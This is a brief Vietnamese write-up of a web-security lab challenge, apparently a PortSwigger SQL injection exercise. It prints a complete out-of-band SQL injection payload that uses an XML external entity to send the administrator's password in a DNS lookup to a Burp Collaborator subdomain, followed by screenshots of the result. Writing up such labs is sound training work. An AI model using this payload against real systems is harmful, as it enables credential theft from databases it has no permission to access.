![image](https://github.com/user-attachments/assets/f9d86f97-9b29-4652-a683-b1dbd5602417)

Thì cơ bản nó cũng giống challenge 16 thôi, nhưng khác ở chỗ là ở challenge này ta phải lấy được data.

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![image](https://github.com/user-attachments/assets/e99190c5-dc11-4c66-8716-2c2bf2b64aef)

![image](https://github.com/user-attachments/assets/0184eade-7bac-48a2-bb41-525836b87768)

Vì ở trên đó là nối chuỗi nên chắc chắn đây là passwd.

![image](https://github.com/user-attachments/assets/61ca76cc-7959-4c3b-87e9-d826a3d78bfe)

Vậy là thành công, idea thì cũng giống challenge 16 thôi.
